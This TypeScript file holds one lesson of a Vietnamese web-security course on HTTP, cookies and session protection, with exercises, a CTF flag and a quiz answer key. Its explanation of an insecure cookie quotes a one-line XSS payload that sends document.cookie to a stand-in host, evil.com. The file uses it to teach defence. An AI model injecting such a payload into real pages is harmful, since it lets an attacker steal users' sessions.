import { CurriculumLesson } from './types';

export const lesson04: CurriculumLesson = {
  id: 4,
  moduleId: 1,
  moduleName: 'Module 1: Nền Tảng Kỹ Thuật (Foundation)',
  title: 'Bài 4: Giao thức Web HTTP, Cookie & Quản trị phiên Session',
  subtitle: 'Giải mã cấu trúc Request/Response, các mã trạng thái Status Code và cơ chế duy trì đăng nhập',
  toolType: 'wireshark',
  theory: {
    summary: [
      'Giao thức HTTP (HyperText Transfer Protocol) là giao thức không lưu trạng thái (Stateless). Máy chủ không tự nhớ ai vừa truy cập.',
      'Để giải quyết vấn đề Stateless, trình duyệt và máy chủ sử dụng Cookie và Token (JWT/Session ID) qua Header: "Set-Cookie" và "Cookie: session_id=...".',
      'Các cờ bảo mật bắt buộc của Cookie: HttpOnly (chống bị đánh cắp qua mã độc JS/XSS), Secure (chỉ gửi qua HTTPS), SameSite=Strict/Lax (chống tấn công CSRF).',
    ],
    plainExplanation:
      'Giao thức HTTP giống như một bác bảo vệ bị mất trí nhớ ngắn hạn: cứ mỗi lần bạn bước vào cửa (bấm F5 hoặc chuyển trang), bác lại hỏi "Anh là ai?". Để không phải gõ lại mật khẩu liên tục, máy chủ phát cho bạn một tấm thẻ ra vào (gọi là Cookie Session ID). Cứ mỗi lần gửi yêu cầu, bạn giơ tấm thẻ đó ra để chứng minh mình đã đăng nhập.',
    keyTakeaway: 'Nếu Cookie đăng nhập không có cờ "HttpOnly", bất kỳ đoạn mã JavaScript độc hại nào trên trang web cũng có thể đọc trộm và gửi ra ngoài.',
  },
  example: {
    title: 'Ví dụ: Thiết lập Cookie an toàn chống tấn công đánh cắp phiên (Session Hijacking)',
    vulnerableCode: `// Lập trình viên cấp phát Cookie thiếu cờ bảo mật:
res.setHeader('Set-Cookie', 'sessionId=abc123xyz; Path=/');
// Hậu quả: Kẻ tấn công dùng XSS đọc sạch qua document.cookie!`,
    vulnerableExplanation:
      'Nếu thiếu cờ HttpOnly và Secure, mã độc XSS chạy trong trình duyệt người dùng có thể dễ dàng gọi "new Image().src = \'http://evil.com/?c=\' + document.cookie" để cướp toàn bộ tài khoản.',
    secureCode: `// Cấu hình Cookie chuẩn an toàn trong Node.js / Express:
res.cookie('sessionId', 'abc123xyz', {
  httpOnly: true, // Trình duyệt cấm hoàn toàn JavaScript truy cập cookie này
  secure: true,   // Bắt buộc chỉ truyền tải qua kênh mã hóa HTTPS
  sameSite: 'strict', // Chặn trình duyệt tự ý gửi cookie từ trang web bên ngoài
  maxAge: 3600000 // Hạn sử dụng 1 giờ
});`,
    secureExplanation:
      'Bộ ba cờ "HttpOnly", "Secure", "SameSite=Strict" tạo thành lá chắn 3 lớp bảo vệ thẻ phiên làm việc trước XSS, Sniffing mạng và CSRF.',
  },
  practice: {
    objective: 'Quan sát gói tin HTTP GET và phân tích Header Set-Cookie cùng mã phản hồi HTTP 200 OK.',
    steps: [
      'Bước 1: Chuyển sang công cụ Packet Inspector.',
      'Bước 2: Chọn gói tin HTTP GET /login.',
      'Bước 3: Mở phần chi tiết Tầng 7 (Application Layer).',
      'Bước 4: Quan sát các dòng User-Agent, Host, Cookie và mã phản hồi 200 OK.',
    ],
    hint: 'Mã 200 là thành công, 301/302 là chuyển hướng, 401/403 là từ chối quyền, 404 là không tìm thấy, 500 là lỗi máy chủ.',
  },
  ctf: {
    scenario: 'Một nhân viên quản trị đã gửi một yêu cầu HTTP có chứa mã Cookie xác thực. Hãy tìm giá trị Session ID được truyền trong Header.',
    flag: 'FLAG{http_stateless_cookie_httponly_flag}',
    hint: 'Tìm trường Cookie: session_id=... trong tiêu đề HTTP.',
    secretReward: 'Tuyệt vời! Bạn đã thấu suốt cách thức phiên làm việc Web được duy trì và bảo vệ an toàn.',
  },
  interview: {
    question: 'Hãy phân biệt sự khác nhau giữa Cookie và Session? Cờ HttpOnly giải quyết được nguy cơ bảo mật gì?',
    answer:
      'Session là dữ liệu phiên làm việc được lưu trữ tại phía máy chủ (Server-side), trong khi Cookie là một mẩu dữ liệu nhỏ được lưu trữ trên trình duyệt của máy khách (Client-side). Server gửi Session ID về client và client lưu nó trong Cookie. Cờ HttpOnly yêu cầu trình duyệt ngăn chặn mọi mã script (JavaScript) đọc hoặc ghi Cookie này, qua đó ngăn chặn kẻ tấn công đánh cắp phiên đăng nhập khi trang web có lỗ hổng XSS.',
    interviewerTip: 'Nhấn mạnh mối quan hệ giữa XSS và HttpOnly; và lưu ý HttpOnly không ngăn chặn được tấn công CSRF.',
  },
  exitChallenge: {
    question: 'Cờ (attribute) nào của Cookie có nhiệm vụ ngăn chặn JavaScript ở phía Client (ví dụ: document.cookie) đọc trộm giá trị của nó?',
    options: [
      { id: 'a', text: 'Secure' },
      { id: 'b', text: 'Domain' },
      { id: 'c', text: 'HttpOnly' },
      { id: 'd', text: 'SameSite' },
    ],
    correctOptionId: 'c',
    explanation: 'Cờ HttpOnly đảm bảo chỉ có trình duyệt được gửi cookie qua các header mạng, ngăn chặn các đoạn mã JavaScript độc hại truy cập.',
  },

  // Backward compatibility
  theorySummary: [
    'Giao thức HTTP là giao thức không lưu trạng thái (Stateless).',
    'Trình duyệt duy trì đăng nhập qua Cookie/Session ID.',
    'Các cờ bảo mật bắt buộc: HttpOnly, Secure, SameSite=Strict/Lax.',
  ],
  taskObjective: 'Phân tích gói tin HTTP GET và các header Set-Cookie trong Packet Inspector.',
  interviewQuestion: {
    question: 'Phân biệt Cookie và Session? Cờ HttpOnly giải quyết nguy cơ gì?',
    answer: 'Session lưu ở server, Cookie lưu ở client. HttpOnly ngăn chặn JavaScript đọc cookie, bảo vệ token khỏi bị đánh cắp qua XSS.',
    interviewerTip: 'Nhắc đến quan hệ XSS và HttpOnly.',
  },
};
